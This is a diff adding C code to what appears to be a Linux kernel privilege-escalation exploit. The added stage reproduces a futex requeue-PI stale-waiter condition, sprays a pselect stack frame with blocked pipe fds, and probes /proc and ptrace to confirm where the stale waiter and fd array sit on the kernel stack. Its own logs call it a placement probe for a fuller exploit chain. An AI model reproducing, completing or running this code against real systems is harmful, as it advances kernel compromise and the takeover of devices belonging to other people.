@@ -507,6 +507,443 @@ static uint32_t h1a_f_pi_chain;
 
 #define H1A_PUNCH_WATCHDOG_TIMEOUT_MS 90000
 
+static atomic_int h1a_w_waiter_ready;
+static atomic_int h1a_w_waiter_waiting;
+static atomic_int h1a_w_owner_started;
+static atomic_int h1a_w_owner_chain_done;
+static atomic_int h1a_w_owner_stop;
+static atomic_int h1a_w_route_done;
+static atomic_int h1a_w_waiter_tid;
+static atomic_int h1a_w_pselect_enter;
+static atomic_int h1a_w_unblock_fd;
+
+static uint32_t h1a_w_f_wait;
+static uint32_t h1a_w_f_pi_target;
+static uint32_t h1a_w_f_pi_chain;
+
+#define H1A_W_WATCHDOG_TIMEOUT_MS 60000
+#define H1A_W_PSELECT_TIMEOUT_SEC 10
+#define H1A_W_STACK_FDS_OFFSET 0x210
+#define H1A_W_STALE_WAITER_OFFSET 0x198
+#define H1A_W_NT_PRSTATUS 1
+#ifndef PTRACE_SEIZE
+#define PTRACE_SEIZE 0x4206
+#endif
+#ifndef PTRACE_INTERRUPT
+#define PTRACE_INTERRUPT 0x4207
+#endif
+#ifndef PTRACE_DETACH
+#define PTRACE_DETACH 0x4208
+#endif
+#ifndef PTRACE_GETREGSET
+#define PTRACE_GETREGSET 0x4204
+#endif
+#ifndef __WALL
+#define __WALL 0x40000000
+#endif
+
+struct h1a_w_user_pt_regs {
+  uint64_t regs[31];
+  uint64_t sp;
+  uint64_t pc;
+  uint64_t pstate;
+};
+
+static pid_t h1a_w_start_watchdog(int *parent_fd) {
+  int pfd[2];
+  pid_t parent_pid = getpid();
+
+  if (pipe(pfd) != 0) {
+    return -1;
+  }
+
+  pid_t pid = fork();
+  if (pid < 0) {
+    close(pfd[0]);
+    close(pfd[1]);
+    return -1;
+  }
+  if (pid == 0) {
+    close(pfd[1]);
+    struct pollfd p = { .fd = pfd[0], .events = POLLIN, .revents = 0 };
+    int ret = poll(&p, 1, H1A_W_WATCHDOG_TIMEOUT_MS);
+    if (ret <= 0) {
+      pr_warning("H1A-W watchdog timeout parent=%d status=stuck\n",
+                 parent_pid);
+      kill(parent_pid, SIGKILL);
+      _exit(2);
+    }
+    _exit(0);
+  }
+
+  pr_info("H1A-W watchdog started pid=%d parent=%d timeout_ms=%d\n",
+          pid, parent_pid, H1A_W_WATCHDOG_TIMEOUT_MS);
+  close(pfd[0]);
+  ks_relocate_fd_min(&pfd[1], KS_FD_PROTECT_MIN);
+  if (parent_fd) {
+    *parent_fd = pfd[1];
+  }
+  return pid;
+}
+
+static void h1a_w_finish_watchdog(pid_t pid, int pfd) {
+  if (pid < 0) {
+    return;
+  }
+  if (pfd >= 0) {
+    char one = 1;
+    ssize_t ignored = write(pfd, &one, sizeof(one));
+    (void)ignored;
+    close(pfd);
+  }
+  int status = 0;
+  waitpid(pid, &status, 0);
+}
+
+static int h1a_w_read_text(pid_t tid, const char *kind,
+                           const char *suffix) {
+  char path[64];
+  char buf[2048];
+  snprintf(path, sizeof(path), "/proc/%d/%s", (int)tid, suffix);
+  int fd = open(path, O_RDONLY | O_CLOEXEC);
+  if (fd < 0) {
+    pr_warning("H1A-W PROBE-DENIED proc=%s errno=%d\n", kind, errno);
+    return 0;
+  }
+  ssize_t n = read(fd, buf, sizeof(buf) - 1);
+  int saved_errno = errno;
+  close(fd);
+  if (n < 0) {
+    pr_warning("H1A-W PROBE-DENIED proc=%s errno=%d\n", kind, saved_errno);
+    return 0;
+  }
+  buf[n] = 0;
+  pr_info("H1A-W proc=%s bytes=%zd\n", kind, n);
+  pr_info("%s", buf);
+  return 1;
+}
+
+static int h1a_w_read_stat_sp(pid_t tid, uint64_t *sp) {
+  char path[64];
+  char buf[4096];
+  snprintf(path, sizeof(path), "/proc/%d/stat", (int)tid);
+  int fd = open(path, O_RDONLY | O_CLOEXEC);
+  if (fd < 0) {
+    pr_warning("H1A-W PROBE-DENIED proc=stat errno=%d\n", errno);
+    return 0;
+  }
+  ssize_t n = read(fd, buf, sizeof(buf) - 1);
+  int saved_errno = errno;
+  close(fd);
+  if (n <= 0) {
+    pr_warning("H1A-W PROBE-DENIED proc=stat errno=%d\n", saved_errno);
+    return 0;
+  }
+  buf[n] = 0;
+
+  char *close_paren = strrchr(buf, ')');
+  if (!close_paren) {
+    pr_warning("H1A-W PROBE-DENIED proc=stat reason=parse\n");
+    return 0;
+  }
+  char *p = close_paren + 1;
+  /* kstkesp is field 29; state is field 3 and is the first field after
+   * the comm close paren. */
+  for (int field = 3; field <= 29; ++field) {
+    while (*p && (*p == ' ' || *p == '\t')) ++p;
+    if (*p == 0) {
+      pr_warning("H1A-W PROBE-DENIED proc=stat reason=short-field\n");
+      return 0;
+    }
+    if (field == 29) {
+      char *end = NULL;
+      unsigned long long value = strtoull(p, &end, 0);
+      if (!end || end == p) {
+        pr_warning("H1A-W PROBE-DENIED proc=stat reason=kstkesp\n");
+        return 0;
+      }
+      *sp = (uint64_t)value;
+      pr_info("H1A-W proc=stat kstkesp=%016llx\n",
+              (unsigned long long)value);
+      return 1;
+    }
+    while (*p && *p != ' ' && *p != '\t') ++p;
+  }
+  pr_warning("H1A-W PROBE-DENIED proc=stat reason=no-kstkesp\n");
+  return 0;
+}
+
+static int h1a_w_get_regs(pid_t tid, uint64_t *sp, uint64_t *pc) {
+  struct h1a_w_user_pt_regs regs;
+  struct iovec io = { .iov_base = &regs, .iov_len = sizeof(regs) };
+
+  long seize = syscall(SYS_ptrace, PTRACE_SEIZE, (long)tid, (void *)0,
+                       (void *)0);
+  if (seize != 0) {
+    pr_warning("H1A-W PROBE-DENIED ptrace-seize errno=%d\n", errno);
+    return 0;
+  }
+
+  errno = 0;
+  long get = syscall(SYS_ptrace, PTRACE_GETREGSET, (long)tid,
+                     (void *)H1A_W_NT_PRSTATUS, &io);
+  if (get != 0) {
+    pr_warning("H1A-W PROBE-DENIED ptrace-getregset errno=%d\n", errno);
+  } else {
+    *sp = regs.sp;
+    *pc = regs.pc;
+    pr_info("H1A-W ptrace pc=%016llx sp=%016llx pstate=%016llx\n",
+            (unsigned long long)regs.pc, (unsigned long long)regs.sp,
+            (unsigned long long)regs.pstate);
+  }
+
+  errno = 0;
+  long interrupt = syscall(SYS_ptrace, PTRACE_INTERRUPT, (long)tid,
+                           (void *)0, (void *)0);
+  if (interrupt == 0) {
+    int status = 0;
+    pid_t stopped = waitpid((pid_t)tid, &status, __WALL);
+    if (stopped < 0) {
+      pr_warning("H1A-W ptrace wait failed errno=%d\n", errno);
+    }
+  } else {
+    pr_warning("H1A-W ptrace interrupt failed errno=%d\n", errno);
+  }
+
+  errno = 0;
+  long detach = syscall(SYS_ptrace, PTRACE_DETACH, (long)tid, (void *)0,
+                        (void *)0);
+  if (detach != 0) {
+    pr_warning("H1A-W ptrace detach failed errno=%d\n", errno);
+  }
+  return get == 0;
+}
+
+static void h1a_w_collect_evidence(void) {
+  pid_t tid = (pid_t)atomic_load(&h1a_w_waiter_tid);
+  uint64_t stat_sp = 0;
+  uint64_t ptrace_sp = 0;
+  uint64_t ptrace_pc = 0;
+  int stat_ok = h1a_w_read_stat_sp(tid, &stat_sp);
+  int stack_ok = h1a_w_read_text(tid, "stack", "stack");
+  int regs_ok = h1a_w_get_regs(tid, &ptrace_sp, &ptrace_pc);
+  int evidence = stat_ok + stack_ok + regs_ok;
+
+  pr_info("H1A-W expected offsets stack_fds=T-0x%03x "
+          "stale_waiter=T-0x%03x\n",
+          H1A_W_STACK_FDS_OFFSET, H1A_W_STALE_WAITER_OFFSET);
+  pr_info("H1A-W evidence stat=%d stack=%d regs=%d sp=%016llx pc=%016llx\n",
+          stat_ok, stack_ok, regs_ok,
+          (unsigned long long)ptrace_sp, (unsigned long long)ptrace_pc);
+  if (ptrace_sp) {
+    pr_info("H1A-W if_sp=T stack_fds=%016llx stale_waiter=%016llx\n",
+            (unsigned long long)(ptrace_sp - H1A_W_STACK_FDS_OFFSET),
+            (unsigned long long)(ptrace_sp - H1A_W_STALE_WAITER_OFFSET));
+  }
+
+  const char *verdict = "PROBE-DENIED";
+  if (regs_ok && is_kernel_ptr(ptrace_sp)) {
+    verdict = "STACK-CONFIRMED";
+  } else if (evidence > 0) {
+    verdict = "PLACEMENT-UNKNOWN";
+  }
+  pr_info("H1A-W verdict=%s\n", verdict);
+}
+
+static void h1a_w_prepare_pselect_fds(fd_set *in, fd_set *out, fd_set *ex) {
+  FD_ZERO(in);
+  FD_ZERO(out);
+  FD_ZERO(ex);
+}
+
+static void h1a_w_pselect_wait(void) {
+  int pipefd[2] = { -1, -1 };
+  int blocked_fd = -1;
+  int unblock_fd = -1;
+
+  if (pipe(pipefd) != 0) {
+    pr_error("H1A-W pipe failed errno=%d\n", errno);
+    atomic_store(&h1a_w_pselect_enter, 2);
+    return;
+  }
+  unblock_fd = (int)fcntl(pipefd[1], F_DUPFD, KS_FD_PROTECT_MIN);
+  blocked_fd = (int)fcntl(pipefd[0], F_DUPFD, KS_FD_PROTECT_MIN);
+  close(pipefd[0]);
+  close(pipefd[1]);
+  pipefd[0] = pipefd[1] = -1;
+  if (unblock_fd < 0 || blocked_fd < 0) {
+    pr_error("H1A-W pipe fd protect failed unblock=%d blocked=%d errno=%d\n",
+             unblock_fd, blocked_fd, errno);
+    if (unblock_fd >= 0) close(unblock_fd);
+    if (blocked_fd >= 0) close(blocked_fd);
+    atomic_store(&h1a_w_pselect_enter, 2);
+    return;
+  }
+  atomic_store(&h1a_w_unblock_fd, unblock_fd);
+
+  int stdio_backup[3] = { -1, -1, -1 };
+  for (int fd = 0; fd < 3; ++fd) {
+    stdio_backup[fd] = fcntl(fd, F_DUPFD, KS_FD_PROTECT_MIN);
+  }
+  for (int fd = 0; fd < SLIDE_PSELECT_NFDS; ++fd) {
+    dup2(blocked_fd, fd);
+  }
+  for (int fd = 0; fd < 3; ++fd) {
+    if (stdio_backup[fd] >= 0) {
+      dup2(stdio_backup[fd], fd);
+    }
+  }
+  close(blocked_fd);
+  blocked_fd = -1;
+
+  fd_set in;
+  fd_set out;
+  fd_set ex;
+  h1a_w_prepare_pselect_fds(&in, &out, &ex);
+  struct timespec timeout = {
+    .tv_sec = H1A_W_PSELECT_TIMEOUT_SEC,
+    .tv_nsec = 0,
+  };
+  pr_info("H1A-W pselect enter nfds=%d timeout=%d blocked-pipe=1\n",
+          SLIDE_PSELECT_NFDS, H1A_W_PSELECT_TIMEOUT_SEC);
+  atomic_store(&h1a_w_pselect_enter, 1);
+  errno = 0;
+  int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, &timeout, NULL);
+  int saved_errno = errno;
+  pr_info("H1A-W pselect returned ret=%d errno=%d\n", ret, saved_errno);
+
+  if (unblock_fd >= 0) {
+    close(unblock_fd);
+    unblock_fd = -1;
+  }
+  atomic_store(&h1a_w_route_done, 1);
+}
+
+static void *h1a_w_waiter_thread(void *arg __attribute__((unused))) {
+  disable_rseq_for_thread();
+
+  int tid = (int)SYSCHK(syscall(SYS_gettid));
+  atomic_store(&h1a_w_waiter_tid, tid);
+
+  if (futex_op(&h1a_w_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
+    pr_error("H1A-W waiter lock chain errno=%d\n", errno);
+    atomic_store(&h1a_w_route_done, 1);
+    return NULL;
+  }
+  atomic_store(&h1a_w_waiter_ready, 1);
+  while (!atomic_load(&h1a_w_owner_started)) {
+    usleep(1000);
+  }
+
+  struct timespec timeout;
+  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
+  timeout.tv_sec += SLIDE_WAIT_SECONDS;
+  atomic_store(&h1a_w_waiter_waiting, 1);
+  errno = 0;
+  int futex_ret = futex_op(&h1a_w_f_wait, FUTEX_WAIT_REQUEUE_PI, 0,
+                           &timeout, &h1a_w_f_pi_target, 0);
+  pr_info("H1A-W waiter futex_requeue_pi ret=%d errno=%d\n",
+          futex_ret, errno);
+  h1a_w_pselect_wait();
+  futex_op(&h1a_w_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+  while (!atomic_load(&h1a_w_owner_chain_done)) {
+    usleep(1000);
+  }
+  return NULL;
+}
+
+static void *h1a_w_owner_thread(void *arg __attribute__((unused))) {
+  disable_rseq_for_thread();
+  if (futex_op(&h1a_w_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
+    pr_error("H1A-W owner lock target errno=%d\n", errno);
+    atomic_store(&h1a_w_owner_chain_done, 1);
+    atomic_store(&h1a_w_owner_stop, 1);
+    return NULL;
+  }
+  while (!atomic_load(&h1a_w_waiter_ready)) {
+    usleep(1000);
+  }
+  atomic_store(&h1a_w_owner_started, 1);
+  while (!atomic_load(&h1a_w_owner_stop)) {
+    sleep(1);
+  }
+  futex_op(&h1a_w_f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+  atomic_store(&h1a_w_owner_chain_done, 1);
+  return NULL;
+}
+
+int slide_h1a_w_test(void) {
+  pid_t watchdog_pid = -1;
+  int watchdog_pipe = -1;
+  int result = 2;
+
+  pr_info("H1A-W route: placement probe, no page preparation, no punch, "
+          "no CFI/full chain\n");
+  h1a_w_f_wait = 0;
+  h1a_w_f_pi_target = 0;
+  h1a_w_f_pi_chain = 0;
+  atomic_store(&h1a_w_waiter_ready, 0);
+  atomic_store(&h1a_w_waiter_waiting, 0);
+  atomic_store(&h1a_w_owner_started, 0);
+  atomic_store(&h1a_w_owner_chain_done, 0);
+  atomic_store(&h1a_w_owner_stop, 0);
+  atomic_store(&h1a_w_route_done, 0);
+  atomic_store(&h1a_w_waiter_tid, 0);
+  atomic_store(&h1a_w_pselect_enter, 0);
+  atomic_store(&h1a_w_unblock_fd, 0);
+
+  watchdog_pid = h1a_w_start_watchdog(&watchdog_pipe);
+  pthread_t waiter;
+  pthread_t owner;
+  SYSCHK(pthread_create(&waiter, NULL, h1a_w_waiter_thread, NULL));
+  SYSCHK(pthread_create(&owner, NULL, h1a_w_owner_thread, NULL));
+
+  while (!atomic_load(&h1a_w_waiter_waiting) ||
+         !atomic_load(&h1a_w_owner_started)) {
+    usleep(1000);
+  }
+  usleep(100000);
+  errno = 0;
+  futex_op(&h1a_w_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
+           &h1a_w_f_pi_target, 0);
+  pr_info("H1A-W requeue issued\n");
+
+  int entered = 0;
+  /* The waiter enters pselect only after its requeue wait times out
+   * (SLIDE_WAIT_SECONDS); allow that plus margin before giving up. */
+  for (int spin = 0; spin < (SLIDE_WAIT_SECONDS + 15) * 1000; ++spin) {
+    entered = atomic_load(&h1a_w_pselect_enter);
+    if (entered != 0) {
+      break;
+    }
+    usleep(1000);
+  }
+  if (entered == 1) {
+    usleep(250000);
+    h1a_w_collect_evidence();
+    int unblock_fd = atomic_load(&h1a_w_unblock_fd);
+    if (unblock_fd > 0) {
+      close(unblock_fd);
+    }
+  } else {
+    pr_warning("H1A-W verdict=PROBE-DENIED reason=pselect-not-entered\n");
+  }
+
+  /* Closing the sole write end wakes the blocked pselect immediately;
+   * the 10s timeout remains the secondary safety net. */
+  while (!atomic_load(&h1a_w_route_done)) {
+    usleep(10000);
+  }
+  atomic_store(&h1a_w_owner_stop, 1);
+  pthread_join(waiter, NULL);
+  pthread_join(owner, NULL);
+  h1a_w_finish_watchdog(watchdog_pid, watchdog_pipe);
+  result = (atomic_load(&h1a_w_pselect_enter) == 1 &&
+            atomic_load(&h1a_w_route_done) == 1) ? 0 : 3;
+  pr_info("H1A-W %s\n", result == 0 ? "done" : "fail");
+  return result;
+}
+
 static pid_t slide_h1a_start_watchdog(int *parent_fd) {
   int pfd[2];
   pid_t parent_pid = getpid();
